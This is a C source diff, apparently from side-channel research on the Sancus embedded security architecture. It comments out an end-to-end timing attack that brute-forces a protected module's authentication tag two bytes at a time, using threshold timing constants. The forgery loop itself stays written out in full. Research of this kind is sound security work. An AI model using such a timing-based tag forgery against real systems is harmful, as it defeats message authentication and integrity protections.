@@ -120,8 +120,9 @@ int main()
     dump_buf(payload, DATA_SIZE + SANCUS_TAG_SIZE, "\tpayload");
     // __sm_pong_handle_input(CONN_ID, payload, DATA_SIZE + SANCUS_TAG_SIZE);
 
-    guess[0] = payload[0];
-    guess[1] = payload[1];
+    for( int i = 0; i < DATA_SIZE; i++ ){
+        guess[i] = payload[i];
+    }
     for ( int e = 0; e <= SANCUS_TAG_SIZE/2; e++ ){
         
         timer_tsc_start();
@@ -133,47 +134,48 @@ int main()
         guess[DATA_SIZE+2*e+1] = payload[DATA_SIZE+2*e+1];
     }
 
-    for( int i = 0; i < DATA_SIZE; i++ ){
-        guess[i] = cipher[i];
-    }
+    // ========================= END-TO-END ATTACK =========================
+    // for( int i = 0; i < DATA_SIZE; i++ ){
+    //     guess[i] = cipher[i];
+    // }
 
-    uint time_constant =
-        #if SANCUS_KEY_SIZE == 8
-            1040    ;
-        #else
-            2211;
-        #endif
-    uint time_constant2 =
-        #if SANCUS_KEY_SIZE == 8
-            93;
-        #else
-            173;
-        #endif
+    // uint time_constant =
+    //     #if SANCUS_KEY_SIZE == 8
+    //         1042    ;
+    //     #else
+    //         2211;
+    //     #endif
+    // uint time_constant2 =
+    //     #if SANCUS_KEY_SIZE == 8
+    //         93;
+    //     #else
+    //         173;
+    //     #endif
 
-    for ( int e = 0; e < SANCUS_TAG_SIZE/2; e++ ){
-        for( int i = 0; i < 256; i++ ){
-            guess[DATA_SIZE+2*e] = i;
-            for( int j = 0; j < 256; j++ ){
-                guess[DATA_SIZE+2*e+1] = j;
+    // for ( int e = 0; e < SANCUS_TAG_SIZE/2; e++ ){
+    //     for( int i = 0; i < 256; i++ ){
+    //         guess[DATA_SIZE+2*e] = i;
+    //         for( int j = 0; j < 256; j++ ){
+    //             guess[DATA_SIZE+2*e+1] = j;
                 
-                timer_tsc_start();
-                __sm_pong_handle_input(CONN_ID, guess, DATA_SIZE + SANCUS_TAG_SIZE);
-                tsc2 = timer_tsc_end();
-                if( tsc2 > time_constant + e*time_constant2 ){
-                    dump_buf(guess, DATA_SIZE+SANCUS_TAG_SIZE, "\tguess");
-                    pr_info1("Time to verify guess: %u\n", tsc2);
-                    break;
-                }
-            }
-            pr_info1("Finished %d/256\n", i+1);
-            if( tsc2 > time_constant + e*time_constant2 ){
-                dump_buf(guess, DATA_SIZE+SANCUS_TAG_SIZE, "\tguess");
-                pr_info1("Time to verify guess: %u\n", tsc2);
-                break;
-            }
-        }
-        pr_info1("Finished %d/8\n", e+1);
-    }
+    //             timer_tsc_start();
+    //             __sm_pong_handle_input(CONN_ID, guess, DATA_SIZE + SANCUS_TAG_SIZE);
+    //             tsc2 = timer_tsc_end();
+    //             if( tsc2 > time_constant + e*time_constant2 ){
+    //                 dump_buf(guess, DATA_SIZE+SANCUS_TAG_SIZE, "\tguess");
+    //                 pr_info1("Time to verify guess: %u\n", tsc2);
+    //                 break;
+    //             }
+    //         }
+    //         pr_info1("Finished %d/256\n", i+1);
+    //         if( tsc2 > time_constant + e*time_constant2 ){
+    //             dump_buf(guess, DATA_SIZE+SANCUS_TAG_SIZE, "\tguess");
+    //             pr_info1("Time to verify guess: %u\n", tsc2);
+    //             break;
+    //         }
+    //     }
+    //     pr_info1("Finished %d/8\n", e+1);
+    // }
 
     FINISH();
 }
